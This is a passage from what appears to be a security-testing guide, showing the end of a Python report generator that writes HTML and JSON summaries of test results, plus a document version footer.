                    <td>{vuln['description']}</td>
                    <td>{vuln['location']}</td>
                </tr>
            '''
        
        html_template += '''
            </table>
        </body>
        </html>
        '''
        
        with open(output_path, 'w') as f:
            f.write(html_template)
    
    def save_json_report(self, output_path):
        """Save report as JSON."""
        with open(output_path, 'w') as f:
            json.dump(self.report_data, f, indent=2)

# Example usage
if __name__ == "__main__":
    report = SecurityTestReport()
    
    # Add sample test results
    report.add_test_results('Command Injection Tests', {
        'total': 25, 'passed': 25, 'failed': 0, 'duration': 5.2
    })
    
    report.add_test_results('Path Traversal Tests', {
        'total': 18, 'passed': 18, 'failed': 0, 'duration': 3.1
    })
    
    # Generate reports
    report.generate_html_report('security_report.html')
    report.save_json_report('security_report.json')
    
    print(f"Security score: {report.calculate_security_score()}/100")
```

---

**Document Version:** 1.0  
**Last Updated:** 2025-01-15  
**Next Security Test Review:** 2025-04-15  
**Contact:** security-testing@development-toolbox.org